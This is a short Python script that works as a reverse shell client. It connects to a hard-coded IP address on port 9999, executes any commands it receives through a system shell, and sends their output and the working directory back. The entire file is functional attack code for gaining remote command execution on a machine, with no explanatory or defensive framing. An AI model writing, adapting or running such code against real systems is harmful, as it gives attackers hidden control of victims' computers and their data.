import socket
import os
import subprocess
import shlex
s = socket.socket()
host = '172.20.10.2'
port = 9999

s.connect((host , port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
        s.send(str.encode(os.getcwd() + ">"))
    else:
        if len(data) > 0:
            # args = shlex.split(data[:].decode("utf-8"))
            # print(args)
            cmd = subprocess.Popen(str(data[:].decode("utf-8")) , shell=True  , stdout=subprocess.PIPE ,
            stdin=subprocess.PIPE , stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            out_string = str(output_byte , "utf-8")
            currentWD = os.getcwd() + ">"
            s.send(str.encode(out_string + currentWD))
            print(out_string)
